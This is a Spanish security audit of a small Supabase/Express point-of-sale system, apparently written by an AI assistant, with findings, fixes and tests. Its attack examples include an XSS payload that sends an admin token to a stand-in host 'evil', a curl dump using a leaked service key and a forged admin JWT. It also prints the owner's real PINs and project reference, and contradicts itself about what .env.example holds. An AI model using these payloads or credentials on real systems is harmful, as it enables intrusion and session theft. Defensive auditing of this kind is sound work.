# Auditoría de Seguridad Ofensiva — Sevelin POS

**Solicitada por:** Bruno (AloraDev) · **Alcance:** proyecto propio, autorización total del titular.
**Fecha:** 14 de agosto de 2026 · **Objetivo:** frontend estático + API Express serverless (Vercel) + Supabase (Postgres).
**Metodología:** revisión de código con enfoque de atacante, sin escaneo activo contra la instancia productiva.

> **Nota de encuadre honesta.** El prompt está redactado para una plataforma SaaS multiempresa de
> salud con WhatsApp e IA. **Sevelin POS no es eso.** Es un POS de un solo negocio, sin multitenancy,
> sin pacientes, sin WhatsApp y sin IA. Auditar contra amenazas que no existen genera hallazgos
> inventados. Abajo marco cada bloque del prompt como **APLICA** o **NO APLICA** con el motivo, y me
> concentro en lo que sí puede comprometer *este* sistema. Un informe que "encuentra" IDOR
> multi-tenant donde no hay tenants es ruido, no seguridad.

---

## 0. Lo primero, porque es lo más grave

Tu captura de Supabase (Security Advisor) y el código apuntan al mismo problema de fondo, y es el
que hay que resolver **hoy, antes que cualquier otro**:

### 🔴 CRÍTICO — Las credenciales del proyecto están comprometidas de hecho

No es teórico. Concatenando lo que veo:

1. El archivo **`.env` real viaja dentro del ZIP** que compartes por chat (lo confirmé: contiene
   `SUPABASE_URL`, `SUPABASE_SERVICE_ROLE_KEY`, `JWT_SECRET`, PINs y CORS con valores reales).
2. Tu captura muestra el **project ref** (`wlqzxvcyynvblhyllzmh`) y la URL del dashboard a plena vista.
3. El **`service_role` key omite RLS por completo** — es la llave maestra de toda la base.

Cualquiera que haya recibido ese ZIP (o esta conversación) tiene, potencialmente, control total de
lectura y escritura sobre Supabase, saltándose toda la lógica del backend. **El Security Advisor que
te preocupa es secundario frente a esto.** RLS no te protege de una llave que, por diseño, ignora RLS.

**Acción inmediata, en este orden:**

1. **Rota el `service_role` key** en Supabase → Settings → API → *Reset*. Esto invalida la llave
   filtrada al instante.
2. **Rota el `anon` key** también (aunque no lo uses en el front, se regenera junto).
3. **Genera un `JWT_SECRET` nuevo** (`openssl rand -base64 48`). Esto cierra todas las sesiones
   activas, incluidas las de un atacante que hubiera falsificado un token.
4. **Cambia `ADMIN_PIN` y `WORKER_PIN`** (ver hallazgo AUTH-02: hoy son los de fábrica).
5. Carga los cuatro valores nuevos **solo** en Vercel → Environment Variables. Nunca más en un
   archivo que salga de tu máquina.

Esto lleva 10 minutos y neutraliza el peor escenario. Todo lo demás del informe puede esperar a
mañana; esto no.

---

## 1. Modelo de amenazas real de este sistema

| Perspectiva del prompt | ¿Aplica? | Por qué |
|---|---|---|
| Usuario anónimo | ✅ | Puede llamar la API; hay que ver qué alcanza sin token. |
| Usuario autenticado (trabajador) | ✅ | Es el rol de menor privilegio. Su escalada a admin es el riesgo central. |
| Usuario malicioso interno | ✅ | Un trabajador con el PIN puede abusar de la lógica de negocio. |
| Administrador comprometido | ⚠️ parcial | Con `service_role` filtrada, "admin comprometido" es redundante: ya tiene todo. |
| Cliente de otra organización | ❌ | **No hay multitenancy.** Un solo negocio, una sola base. No existe "otra organización". |
| Bot automatizado / fuerza bruta | ✅ | El login por PIN de 4 dígitos es un blanco natural. |
| Atacante externo | ✅ | CORS, exposición de API, robo de token. |

**Bloques del prompt que NO APLICAN a este sistema** (y por qué no los invento):

- **Multitenancy / aislamiento entre clínicas** — no hay tenants. Ni una tabla tiene `org_id`.
- **WhatsApp y automatizaciones** — no existe integración de mensajería en el código.
- **Inteligencia Artificial / prompt injection** — no hay LLM ni herramientas conectadas en el
  producto. (La IA está en *esta* conversación de desarrollo, no en el POS.)
- **Salud / pacientes / turnos** — el dominio es ventas y reparación de equipos, no salud.

---

## 2. Hallazgos que APLICAN, por severidad

### 🔴 SEC-01 · `service_role` como único guardián: RLS deshabilitada en todas las tablas

- **Severidad:** Crítica.
- **Descripción técnica.** El backend usa `SUPABASE_SERVICE_ROLE_KEY`, que **omite RLS por
  diseño**. Toda la autorización vive en el middleware `auth()` de Express. La base, por debajo, no
  tiene ninguna política: el propio Advisor lista *RLS Disabled in Public* en las 16 tablas. Esto
  significa que **la seguridad de los datos depende al 100% de que el proceso Node sea el único
  camino a la base**. En cuanto la `service_role` se filtra (ver sección 0), no queda ninguna
  segunda línea de defensa.
- **Vector de ataque.** Poseer la `service_role` key → conexión directa a PostgREST/Postgres →
  lectura y escritura totales sin pasar por Express.
- **Explotación paso a paso.**
  1. Atacante obtiene la llave del `.env` filtrado.
  2. `curl 'https://<ref>.supabase.co/rest/v1/ventas?select=*' -H "apikey: <service_role>" -H "Authorization: Bearer <service_role>"`.
  3. Devuelve todas las ventas, costos y utilidades. Con `PATCH`/`DELETE`, altera o borra cualquier cosa.
- **Impacto.** Compromiso total de confidencialidad, integridad y disponibilidad de los datos.
- **Recomendación.** Defensa en profundidad, no "o RLS o backend", sino **ambos**:
  1. Rotar la llave (sección 0).
  2. **Activar RLS en las 16 tablas** aunque el backend siga usando `service_role`. Con RLS activa y
     **sin políticas**, PostgREST con la llave `anon` no devuelve nada — cierra el acceso directo con
     la llave pública, que es la que más fácil se filtra. El `service_role` sigue funcionando para tu
     backend. Es exactamente lo que el Advisor pide y es correcto hacerlo.
  3. A mediano plazo, evaluar mover la autenticación a **Supabase Auth** y usar la llave `anon` +
     RLS por rol, para que la base valide por sí misma. Es un refactor grande; no es para esta semana.
- **Mitigación en SQL** (resuelve los 13 errores *RLS Disabled* del Advisor de una vez):
  ```sql
  DO $$
  DECLARE t text;
  BEGIN
    FOR t IN
      SELECT tablename FROM pg_tables WHERE schemaname = 'public'
    LOOP
      EXECUTE format('ALTER TABLE public.%I ENABLE ROW LEVEL SECURITY;', t);
    END LOOP;
  END $$;
  -- Sin CREATE POLICY: la llave anon queda sin acceso; el service_role del backend sigue entrando.
  ```
- **Caso de prueba.** Tras aplicarlo, con la llave `anon`:
  `curl '.../rest/v1/productos?select=*' -H "apikey: <ANON>"` → debe devolver `[]` o error de
  permiso, **no** el catálogo.

> Sobre los tres *Security Definer View* del Advisor (`v_producto_lotes_vigentes`,
> `v_ventas_por_medio`, `v_balance_ventas`): son vistas de solo lectura sobre datos que tu backend ya
> expone a admin. El riesgo real es bajo *mientras* la base no esté expuesta por la llave anon. Al
> activar RLS arriba, deja de importar. Si quieres cerrarlo formalmente, recréalas con
> `WITH (security_invoker = true)`.

---

### 🔴 AUTH-01 · El rol viaja dentro del JWT y no se revalida nunca

- **Severidad:** Alta (Crítica si el `JWT_SECRET` se filtra — y se filtró).
- **Descripción técnica.** `firmarToken(rol)` mete `{ rol }` en el JWT. El middleware `auth()` confía
  en ese claim (`req.usuario.rol`) para autorizar. **No hay tabla de sesiones ni revalidación contra
  una fuente de verdad.** Si un atacante conoce el `JWT_SECRET`, se firma a sí mismo un token
  `{ rol: 'admin' }` con `expiresIn` largo y es administrador para siempre, hasta que rotes el secreto.
- **Vector.** `JWT_SECRET` filtrado (está en el `.env` del ZIP) → forjar token admin.
- **Explotación.**
  ```js
  jwt.sign({ rol: 'admin' }, '<JWT_SECRET_filtrado>', { expiresIn: '999d' })
  // → Authorization: Bearer <ese token> contra cualquier endpoint auth(true)
  ```
- **Impacto.** Escalada vertical total (trabajador → admin) y persistencia: el token forjado
  sobrevive a cambios de PIN, porque el login ya no interviene.
- **Recomendación.**
  1. Rotar `JWT_SECRET` (sección 0) — invalida todos los tokens, forjados o no.
  2. Bajar `TOKEN_TTL` de **12h** a algo como **2–4h**. 12 horas es una ventana amplia para un token robado.
  3. Considerar un `jti` + lista de revocación (aunque en serverless sin estado compartido es
     incómodo; el TTL corto es el 80% del beneficio con el 20% del trabajo).
- **Caso de prueba.** Firmar un token admin con el secreto **viejo** tras la rotación y llamar
  `GET /api/me` → debe responder `401`.

---

### 🟠 AUTH-02 · PINs de fábrica y de 4 dígitos numéricos

- **Severidad:** Alta.
- **Descripción técnica.** Confirmado por comparación directa: `ADMIN_PIN` real = `9067` y
  `WORKER_PIN` = `0495`, **idénticos a los defaults del código** (`api/index.js`) y del
  `.env.example` versionado en git. Además son 4 dígitos: espacio de 10.000 combinaciones.
- **Vector.** Credential stuffing / fuerza bruta / conocimiento público del default.
- **Explotación.** El `.env.example` está en el historial de git con `ADMIN_PIN=9067`. Cualquiera que
  clone o vea el repo prueba `9067` y entra como admin. No hace falta ni fuerza bruta.
- **Freno actual (parcial).** `frenoLogin` bloquea 1 minuto tras 5 fallos **por IP y por instancia
  serverless**. Un atacante distribuido (varias IP) o que espera el reset de instancia diluye el
  freno. Para 10.000 combinaciones, un freno por-instancia es débil.
- **Impacto.** Acceso admin trivial.
- **Recomendación.**
  1. Cambiar ambos PINs **ya** por valores que no sean los de fábrica.
  2. Ahora que el campo admite letras (cambio v6), usar claves alfanuméricas de ≥8 caracteres para
     el admin. Sube el espacio de 10⁴ a >10¹⁴.
  3. Endurecer el freno: contador con backoff creciente y, si se puede, respaldarlo en una tabla o
     en Upstash/Redis para que sea global y no por-instancia.
  4. Quitar los defaults del código: que arranque con error si el PIN no está definido, en vez de
     caer silenciosamente a `9067`.
- **Mitigación en código:**
  ```js
  // Sin PIN configurado NO se arranca con uno de fábrica.
  const { ADMIN_PIN, WORKER_PIN } = process.env;
  if (!ADMIN_PIN || !WORKER_PIN || ADMIN_PIN === '9067') {
    throw new Error('Configura ADMIN_PIN y WORKER_PIN con valores propios (no los de ejemplo).');
  }
  ```
- **Caso de prueba.** `POST /api/login {"pin":"9067"}` debe responder `401` tras el cambio.

---

### 🟠 XSS-01 · XSS persistente vía nombre de producto / campos de OT

- **Severidad:** Alta.
- **Descripción técnica.** Varios módulos interpolan datos controlables por el usuario directamente
  en `innerHTML` **sin escapar**. Ejemplos confirmados:
  - `js/pos.js` → nombre del producto en el carrito (`<td>${item.nombre}`), en sugerencias
    (`<span>${p.nombre}</span>`) y en "dividir venta".
  - `js/ot.js` → `cliente_nombre`, `cliente_telefono`, `falla_reportada` en la tabla de órdenes
    (`<td>${o.cliente_nombre}...`).
  El backend `sanearOT()` hace `.trim()` pero **no escapa HTML**, así que un `<img src=x onerror=...>`
  en el nombre de un cliente o producto se guarda tal cual y se ejecuta al renderizar la lista.
- **Vector.** XSS persistente (stored). El payload entra por un campo de alta y se dispara cuando
  cualquier usuario (incluido el admin) abre la vista que lo lista.
- **Escenario de explotación paso a paso.**
  1. Un trabajador (rol bajo) crea una OT con `cliente_nombre` =
     `<img src=x onerror="fetch('https://evil/x?t='+sessionStorage.pos_token)">`.
  2. El admin abre Servicio Técnico. El navegador del admin ejecuta el payload.
  3. Como **el token vive en `sessionStorage`** (accesible por JS, ver XSS-02), se exfiltra el token
     del admin. Escalada trabajador → admin vía XSS.
- **Impacto.** Robo de sesión de admin, ejecución de acciones en su nombre, defacement del POS.
- **Recomendación.** Escapar **toda** interpolación de datos de usuario en `innerHTML`. Ya existen
  helpers en el proyecto (`escaparHTML` en print.js, `escaparHtmlHist` en historial.js, `escaparTexto`
  en balance.js) — **el problema es que no se usan de forma consistente**. Unificar en uno solo y
  aplicarlo en todos los `${...}` que reciban `nombre`, `cliente_*`, `falla_reportada`, `descripcion`,
  `obs_*`, `sku`, `serial_number`.
- **Mitigación en código** (patrón a aplicar en cada punto):
  ```js
  const esc = s => String(s ?? '').replace(/[&<>"']/g, c =>
    ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));

  // Antes:  <td>${item.nombre}</td>
  // Después:<td>${esc(item.nombre)}</td>
  ```
  Complementariamente, definir defensa en profundidad con `textContent` donde no se necesite HTML.
- **Caso de prueba.** Crear un producto llamado `<b>x</b>` y agregarlo al carrito: debe verse el
  texto literal `<b>x</b>`, no una "x" en negrita.

---

### 🟠 XSS-02 · Token en `sessionStorage` (accesible a cualquier XSS)

- **Severidad:** Alta (habilitante de XSS-01) — **atenuada**, no resuelta, por CSP.
- **Descripción técnica.** El JWT se guarda en `sessionStorage` (`js/api.js`). Cualquier JS del
  origen lo lee. Combinado con XSS-01, un solo `<script>` roba la sesión. Además, `helmet` corre con
  **`contentSecurityPolicy: false`**, así que no hay CSP que limite de dónde se cargan/ejecutan
  scripts ni a dónde se puede exfiltrar.
- **Impacto.** Convierte cualquier XSS en robo de sesión inmediato.
- **Recomendación (en orden realista para este proyecto).**
  1. Arreglar XSS-01 (la causa). Sin XSS, el `sessionStorage` es mucho menos interesante.
  2. **Activar una CSP** aunque sea básica. Hoy está apagada. Una CSP que prohíba `inline`
     inesperado y restrinja `connect-src` a tu propio dominio corta la exfiltración incluso si se
     cuela un XSS. Requiere mover el JS inline a archivos (el proyecto ya es casi todo archivos .js).
  3. El paso "ideal" de mover el token a una cookie `HttpOnly + SameSite=Strict` implica que el
     backend emita y lea cookies y romper el modelo actual de `Authorization: Bearer`. Es un cambio
     mayor; anótalo como objetivo, no como parche urgente.
- **Mitigación (CSP mínima en `vercel.json`):**
  ```json
  { "key": "Content-Security-Policy",
    "value": "default-src 'self'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co; style-src 'self' 'unsafe-inline'; script-src 'self'" }
  ```
  (Ajustar `script-src`/`style-src` según los CDN que uses; probar en preview antes de producción.)
- **Caso de prueba.** Con la CSP activa, un `fetch('https://evil/...')` inyectado debe fallar en
  consola por violación de `connect-src`.

---

### 🟡 BIZ-01 · Precio y costo negativos aceptados (lógica de negocio)

- **Severidad:** Media.
- **Descripción técnica.** `normalizarItems()` calcula `precio = num(it.precio_unitario)` y
  `num = v => Number(v) || 0`. **No se rechaza un valor negativo.** `subtotal = precio * cantidad`
  puede ser negativo, y `totalizar()` suma sin piso. Un ítem con `precio_unitario: -50000` reduce el
  total de la venta.
- **Vector.** API abuse / manipulación de lógica de negocio por usuario autenticado (basta trabajador).
- **Escenario.** Cobrar $10.000, agregar una línea "descuento" con precio `-9000`, total real $1.000,
  pero el sistema registra una venta "válida". Distorsiona caja, utilidad y arqueo. En un arqueo, la
  diferencia se justifica como "descuento". Genera pérdida económica encubierta.
- **Impacto.** Fraude interno, inconsistencia contable, arqueos cuadrados artificialmente.
- **Recomendación.** Validar en el servidor que `precio_unitario >= 0`, `cantidad >= 1` y
  `costo_unitario >= 0`. Si se quieren descuentos, modelarlos como un campo explícito, no como líneas
  negativas.
- **Mitigación en código** (en `normalizarItems`, dentro del `.map`):
  ```js
  const precio = Math.max(0, num(it.precio_unitario));
  const cantidad = Math.max(1, Math.round(num(it.cantidad) || 1));
  if (num(it.precio_unitario) < 0) throw new Error('Precio inválido en un ítem de la venta');
  ```
- **Caso de prueba.** `POST /api/ventas` con un ítem `precio_unitario: -1000` → `400`, no `201`.

---

### 🟡 BIZ-02 · Venta sin verificación de stock disponible

- **Severidad:** Media.
- **Descripción técnica.** `POST /api/ventas` descuenta stock (`ajustarStock`) pero **no valida que
  haya stock suficiente antes**. `ajustarStock` usa `Math.max(0, ...)` solo en la ruta de lotes; en
  la de productos simples puede dejar stock en negativo o en cero sin frenar la venta.
- **Vector.** Lógica de negocio.
- **Escenario.** Vender 100 unidades de un producto con 3 en stock. La venta se registra, el
  inventario queda inconsistente (negativo o forzado a 0), y el reporte de mermas/inventario miente.
- **Impacto.** Inconsistencia de inventario, no un compromiso de seguridad. Severidad media por
  impacto operativo.
- **Recomendación.** Antes de insertar la venta, verificar stock de cada ítem no ilimitado y
  rechazar si `cantidad > stock`. Ojo con la concurrencia: dos ventas del mismo producto casi
  simultáneas necesitan que el chequeo y el descuento sean atómicos (idealmente una función Postgres
  con `SELECT ... FOR UPDATE`, como ya se hace para lotes con `fifo_consumir`).
- **Caso de prueba.** Producto con stock 1; dos `POST /api/ventas` simultáneos de cantidad 1 → solo
  uno debe tener éxito.

---

### 🟡 FILE-01 · Bucket de documentos público y sin validación de tipo real

- **Severidad:** Media.
- **Descripción técnica.** `POST /api/compras/archivo` sube a `compras-documentos` y devuelve
  `getPublicUrl()` — **bucket público**. La validación de tipo confía en el `tipo` que manda el
  cliente (`contentType: tipo || ...`), no en el contenido real del archivo. El nombre se sanea bien
  (`replace(/[^\w.\-]/g,'_')`, sin traversal), y el tamaño se limita a 4 MB, eso está correcto.
- **Vector.** File upload + exposición de archivos privados + enumeración.
- **Escenario.**
  1. La ruta es `AÑO/timestamp_nombre`. El `timestamp` (`Date.now()`) es **predecible**: quien
     conozca aproximadamente cuándo se subió un documento puede tantear URLs públicas y **enumerar
     comprobantes de compra** (facturas de proveedores, datos sensibles del negocio) sin autenticarse.
  2. Un archivo HTML subido con `tipo: image/png` queda accesible por URL pública y, si se abre
     directo, el navegador podría interpretarlo (menor, pero suma a XSS servido desde tu dominio de
     storage).
- **Impacto.** Fuga de documentos financieros del negocio a un anónimo que adivine URLs.
- **Recomendación.**
  1. Hacer el bucket **privado** y servir con `createSignedUrl()` (URL firmada con expiración) en vez
     de `getPublicUrl()`. Solo quien pasa por tu backend autenticado obtiene el enlace.
  2. Añadir aleatoriedad al path (`crypto.randomUUID()`) para que no sea enumerable aunque quede público.
  3. Validar el tipo por *magic bytes*, no por el header del cliente.
- **Mitigación en código:**
  ```js
  const ruta = `${new Date().getFullYear()}/${crypto.randomUUID()}_${limpio}`;
  // ...subir con upsert:false...
  const { data, error } = await db.storage.from('compras-documentos')
    .createSignedUrl(ruta, 60 * 60); // 1h, y el bucket en privado
  ```
- **Caso de prueba.** Con el bucket privado, abrir la URL pública anterior de un documento → `403`.

---

### 🟡 BIZ-03 · Cambio de tipo de DTE post-venta sin traza ni control de rol

- **Severidad:** Media (mayor si te fiscaliza el SII).
- **Descripción técnica.** `POST /api/ventas/:id/dte` permite cambiar `tipo_dte`
  (BOLETA/FACTURA/SIN DTE) de una venta ya registrada, con `auth()` — **cualquier trabajador**, sin
  registro de quién ni cuándo lo cambió.
- **Vector.** Lógica de negocio / integridad tributaria.
- **Escenario.** Registrar ventas como "SIN DTE" durante el día y, a fin de mes, cambiarlas
  masivamente para cuadrar. O a la inversa. No queda rastro.
- **Impacto.** Inconsistencia tributaria, potencial evasión, sin pista de auditoría.
- **Recomendación.** Restringir el cambio a admin (`auth(true)`), registrar el cambio (valor
  anterior, nuevo, timestamp, rol) en una tabla de auditoría, y evaluar si tras cierto tiempo o tras
  emitir el DTE real debe quedar inmutable.
- **Caso de prueba.** Trabajador llama `POST /api/ventas/1/dte` → debe responder `403`.

---

### 🔵 INFO-01 · CORS con fallback a `*` y aceptación de peticiones sin `Origin`

- **Severidad:** Baja (en la config actual; sería Alta si `CORS_ORIGINS=*`).
- **Descripción técnica.** Tu `CORS_ORIGINS` de producción está bien acotado
  (`sevelin-pos-oficial.vercel.app` + locales). Pero el código **acepta `*` si la variable no está**,
  y siempre permite peticiones **sin header `Origin`** (`if (!origin ... ) return cb(null, true)`).
  CORS no protege contra `curl`/Postman de todos modos (no mandan Origin), así que esto no es un
  agujero por sí solo, pero el fallback a `*` es una trampa: si algún deploy queda sin la variable,
  se abre a cualquier origen.
- **Recomendación.** Quitar el fallback a `*`: si `CORS_ORIGINS` no está definida, denegar por
  defecto en producción. El acceso desde herramientas sigue funcionando porque la protección real es
  el JWT, no CORS.
- **Mitigación:** `const origenes = (CORS_ORIGINS || '').split(',')...` sin `'*'` como valor aceptado
  en la comparación.

---

## 3. Lo que se revisó y está BIEN (no todo son hallazgos)

Documentar lo correcto es parte de una auditoría honesta:

- **SQL Injection — no encontrado.** Se usa el query builder de Supabase (PostgREST) en todo el
  backend; no hay concatenación de SQL crudo. Los comodines de `ilike` en el buscador por producto
  (cambio v6) **se escapan** correctamente. ✅
- **Costos y utilidades ocultos a trabajadores en el servidor** (`limpiarParaRol`), no solo en CSS.
  Un trabajador que llame la API directo tampoco ve márgenes. ✅ (El `admin-only` de CSS es solo
  cosmético, pero la protección real está en el backend, que es lo correcto.)
- **Comisión del POS calculada siempre en el servidor**, no confía en el cliente. ✅
- **Costo de venta forzado desde el catálogo para trabajadores** (no aceptan el costo del navegador). ✅
- **PIN de admin re-exigido y validado en el servidor** para operaciones destructivas masivas
  (`exigirPinAdmin` en borrado de catálogo/historial/lotes). ✅
- **Path traversal en subida de archivos — mitigado** por el saneo de nombre. ✅
- **`.env` correctamente listado en `.gitignore`**, y no hay llaves reales commiteadas en el
  historial de git (revisado: solo placeholders en `.env.example`). El problema es el ZIP, no el repo. ✅
- **Cabeceras `X-Content-Type-Options` y `Referrer-Policy`** presentes en `vercel.json`. ✅

---

## 4. Vulnerabilidades del prompt evaluadas y descartadas (con motivo)

No para rellenar, sino para que conste que se miraron:

- **SSRF** — el backend no hace fetch a URLs provistas por el usuario. No aplica.
- **RCE / Insecure Deserialization** — no hay `eval`, ni `child_process`, ni deserialización de
  objetos del usuario. `express.json` parsea JSON plano. No aplica.
- **Open Redirect** — no hay redirecciones basadas en parámetros del usuario.
- **CSRF** — la API usa `Authorization: Bearer` (no cookies), así que un sitio de terceros no puede
  montar el header automáticamente. El modelo Bearer inmuniza CSRF de forma natural. No aplica.
- **Clickjacking** — falta `X-Frame-Options`/`frame-ancestors`; bajo impacto en un POS de mostrador,
  pero se puede añadir `frame-ancestors 'none'` en la CSP de INFO-01. Menor.
- **LFI / Path traversal en lectura** — no hay lectura de archivos por ruta del usuario.
- **IDOR clásico entre usuarios** — no hay "usuarios" con datos propios: hay dos roles sobre datos
  **compartidos** de un mismo negocio. Un trabajador que lee la venta `:id` de otro no es IDOR: es su
  trabajo, ambos operan el mismo POS. Lo que sí importa es la escalada de rol (AUTH-01/02), cubierta.

---

## 5. Plan de remediación priorizado

| Prioridad | Acción | Hallazgo | Esfuerzo |
|---|---|---|---|
| **1 · HOY** | Rotar `service_role`, `anon`, `JWT_SECRET`; cambiar ambos PINs | SEC-01, AUTH-01, AUTH-02 | 10 min |
| **2 · HOY** | Activar RLS en las 16 tablas (script de la sección 2) | SEC-01 | 5 min |
| **3 · esta semana** | Escapar HTML en todos los `innerHTML` con datos de usuario | XSS-01 | 2–3 h |
| **4 · esta semana** | Validar precio/costo ≥ 0 y stock disponible en el servidor | BIZ-01, BIZ-02 | 1–2 h |
| **5 · esta semana** | Bucket de documentos a privado + URLs firmadas + UUID en path | FILE-01 | 1 h |
| **6 · próxima** | CSP en `vercel.json`; bajar `TOKEN_TTL` a 2–4h | XSS-02, AUTH-01 | 1–2 h |
| **7 · próxima** | DTE post-venta solo admin + tabla de auditoría | BIZ-03 | 1–2 h |
| **8 · backlog** | Quitar fallback CORS `*`; quitar defaults de PIN del código | INFO-01, AUTH-02 | 30 min |
| **9 · proyecto** | Evaluar migración a Supabase Auth + RLS por rol | SEC-01 | grande |

---

## 6. Cierre

El sistema **no es un colador**, y lo digo sin adornar: la lógica de negocio sensible (costos,
comisión, PIN destructivo) sí se valida en el servidor, no confía en el cliente, y no hay SQLi ni RCE.
Eso está por encima del promedio de un POS hecho a medida.

El problema real es de **postura de seguridad**, no de un bug puntual: toda la defensa descansa en una
única llave que ya salió de tu control, sobre una base sin RLS, con PINs de fábrica y un token que
lleva el rol autofirmado. Ninguno de esos cuatro es difícil de explotar por separado, y juntos son la
cadena completa "anónimo → admin → base entera".

La buena noticia: los cuatro se cierran en **una tarde**. Rotar llaves y activar RLS (pasos 1 y 2)
te sacan del escenario crítico hoy mismo. El resto es endurecimiento ordenado.

Si quieres, en la próxima sesión implemento los parches de código (XSS-01, BIZ-01, BIZ-02, FILE-01,
CSP) directamente sobre el proyecto y te dejo las pruebas que los validan, como hicimos con los
cambios de la v6.
